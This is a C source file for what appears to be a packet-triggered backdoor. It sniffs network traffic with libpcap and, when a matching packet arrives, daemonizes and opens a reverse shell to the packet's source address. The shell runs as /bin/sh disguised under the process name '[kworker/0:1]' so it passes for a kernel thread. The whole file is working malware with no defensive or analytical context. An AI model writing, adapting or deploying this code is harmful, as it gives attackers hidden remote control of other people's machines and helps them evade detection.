#include <stdio.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>

int addr_location = -1;
int port_location = 0;
int port_offset = 0;	// conn_port == port + port_offset
int conn_port = 0;

int packet_find(const u_char *packet, struct in_addr *addr, unsigned short *port) {
	struct ether_header *etherhdr;
	struct iphdr *iphdr;
	etherhdr = (struct ether_header *)packet;
	if (ntohs(etherhdr->ether_type) != ETHERTYPE_IP) {
		return -1;
	}
	iphdr = (struct iphdr *)(packet + sizeof(struct ether_header));
	if (addr_location == -1) {
		*addr = *(struct in_addr *)&(iphdr->saddr);
	} else {
		*addr = *(struct in_addr *)(packet + addr_location);
	}
	*port = ntohs(*(unsigned short *)(packet + port_location)) + port_offset;
	return 1;
}

void conn(struct in_addr *addr, unsigned short port) {
	struct sockaddr_in serv_addr;
	int sockfd;
	char *shell_name = "/bin/sh";
	//char *argv[] = {"sh", NULL};
	char *argv[] = {"[kworker/0:1]", NULL};
	char *envp[] = {0, NULL};
	int ret;
	close(0);
	close(1);
	close(2);
	close(3); // capture_fd
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr = *addr;
	serv_addr.sin_port = htons(port);
	sockfd  = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr)) == -1) {
		exit(0);
	}
	dup(sockfd);
	dup(sockfd);
	execve(shell_name, argv, envp);
}

void packet_process(u_char *arg, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
	//printf("%d %d\n", pkthdr->caplen, pkthdr->len);
	pid_t pid;
	int status;
	struct in_addr addr;
	unsigned short port;
	char ip[16];

	if (packet_find(packet, &addr, &port) != 1)  return;

	if ((pid = fork()) == 0) {
		if (conn_port != 0) {
			port = conn_port;
		}
		inet_ntop(AF_INET, (void *)&addr, ip, 16);
		printf("%s:%d\n", ip, port);
		daemon(0, 0);
		conn(&addr, port);
	} else if (pid == -1) {
		return;
	}
	waitpid(pid, &status, 0);	// avoid "[a.out] <defunct>"
	
	return;
}

int main(int argc, char **argv) {
	char dev[10] = {"eth0"};
	pcap_t *descr;
	struct bpf_program fp;
	char filter_str[100] = {'\0'};
	int opt = 0;
	int set_daemon = 0;

	while ((opt = getopt(argc, argv, "i:f:a:p:o:P:d")) != -1) {
		switch(opt) {
			case 'i': strcpy(dev, optarg); break;
			case 'f': strcpy(filter_str, optarg); break;
			case 'a': addr_location = atoi(optarg); break;
			case 'p': port_location = atoi(optarg); break;
			case 'o': port_offset = atoi(optarg); break;	// 回连端口 + port_offset
			case 'P': conn_port = atoi(optarg); break;	// 指定回连端口
			case 'd': set_daemon = 1; break;
		}
	}
	printf("i:%s f:%s a:%d p:%d d:%d\n", dev, filter_str, addr_location, port_location, set_daemon);

	if (set_daemon) daemon(0, 0);
	descr = pcap_open_live(dev, BUFSIZ, 0, 5, NULL);

	if (filter_str != NULL) {
		if (pcap_compile(descr, &fp, filter_str, 0 ,0) == -1) {
			fprintf(stderr, "error compile filter:%s\n", filter_str);
			exit(-1);
		}

		if (pcap_setfilter(descr, &fp) == -1) {
			fprintf(stderr, "error set filter\n");
			exit(-1);
		}
	}

	pcap_loop(descr, -1, packet_process, NULL);

	return 1;
}
